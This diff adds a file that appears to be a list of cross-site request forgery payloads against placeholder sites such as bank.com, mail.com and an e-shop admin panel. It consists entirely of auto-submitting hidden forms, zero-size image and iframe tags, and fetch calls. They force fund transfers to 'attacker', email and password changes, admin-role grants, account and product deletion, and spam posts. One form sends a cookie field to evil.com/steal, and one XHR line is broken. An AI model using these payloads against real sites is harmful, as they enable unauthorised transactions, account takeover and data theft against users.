@@ -1,0 +1,29 @@
+<form action="http://bank.com/transfer" method="POST"><input type="hidden" name="amount" value="10000"><input type="hidden" name="to" value="attacker"></form><script>document.forms[0].submit()</script>
+<img src="http://bank.com/transfer?amount=10000&to=attacker" width=0 height=0>
+<iframe src="http://bank.com/transfer?amount=10000&to=attacker" width=0 height=0></iframe>
+<link rel="stylesheet" href="http://bank.com/transfer?amount=10000&to=attacker">
+<embed src="http://bank.com/transfer?amount=10000&to=attacker" width=0 height=0>
+<frame src="http://bank.com/transfer?amount=10000&to=attacker" width=0 height=0>
+<object data="http://bank.com/transfer?amount=10000&to=attacker" width=0 height=0>
+<script>fetch('http://bank.com/transfer',{method:'POST',body:'amount=10000&to=attacker'})</script>
+<script>new XMLHttpRequest().open('POST','http://bank.com/transfer',true);xhr.send('amount=10000&to=attacker');</script>
+<script>fetch('http://api.bank.com/transfer',{method:'POST',credentials:'include',body:new URLSearchParams({amount:10000,to:'attacker'})})</script>
+<form action="http://evil.com/steal" method="POST"><input type="hidden" name="cookie" value="test"></form><script>document.cookie='session=abc123';document.forms[0].submit()</script>
+<form action="http://bank.com/change-email" method="POST"><input type="hidden" name="email" value="attacker@evil.com"><input type="hidden" name="csrf" value="00000000-0000-0000-0000-000000000000"></form><script>document.forms[0].submit()</script>
+<form action="http://bank.com/add-user" method="POST"><input type="hidden" name="username" value="attacker"><input type="hidden" name="role" value="admin"></form><script>document.forms[0].submit()</script>
+<img src="http://bank.com/change-password?new_password=hacked123&confirm_password=hacked123">
+<form action="http://bank.com/delete-account" method="POST"><input type="hidden" name="confirm" value="yes"></form><script>document.forms[0].submit()</script>
+<form action="http://api.bank.com/v1/transfer" method="POST" enctype="text/plain"><input name="__proto__[admin]" value="true"></form><script>document.forms[0].submit()</script>
+<form action="http://bank.com" method="POST"><input type="hidden" name="cmd" value="delete_all"></form><script>document.forms[0].submit()</script>
+<form action="http://social.com/follow" method="POST"><input type="hidden" name="user" value="attacker"></form><script>document.forms[0].submit()</script>
+<form action="http://social.com/post" method="POST"><input type="hidden" name="content" value="spam"></form><script>document.forms[0].submit()</script>
+<form action="http://forum.com/change-email" method="POST"><input type="hidden" name="email" value="attacker@evil.com"></form><script>document.forms[0].submit()</script>
+<form action="http://forum.com/delete-post" method="POST"><input type="hidden" name="post_id" value="123"></form><script>document.forms[0].submit()</script>
+<form action="http://mail.com/send" method="POST"><input type="hidden" name="to" value="attacker@evil.com"><input type="hidden" name="subject" value="spam"><input type="hidden" name="body" value="spam"></form><script>document.forms[0].submit()</script>
+<img src="http://mail.com/read?msg_id=123">
+<form action="http://bank.com/logout" method="POST">
+<form action="http://bank.com" method="POST"><input type="hidden" name="action" value="transfer"><input type="hidden" name="amount" value="10000"><input type="hidden" name="destination" value="attacker"></form><script>document.forms[0].submit()</script>
+<form action="http://bank.com/approve" method="POST"><input type="hidden" name="loan_id" value="123"><input type="hidden" name="approve" value="yes"></form><script>document.forms[0].submit()</script>
+<form action="http://admin.e-shop.com/products/delete" method="POST"><input type="hidden" name="product_id" value="42"></form><script>document.forms[0].submit()</script>
+<form action="http://admin.e-shop.com/users/delete" method="POST"><input type="hidden" name="user_id" value="1"></form><script>document.forms[0].submit()</script>
+<img src="http://admin.e-shop.com/orders/cancel?order_id=9876">
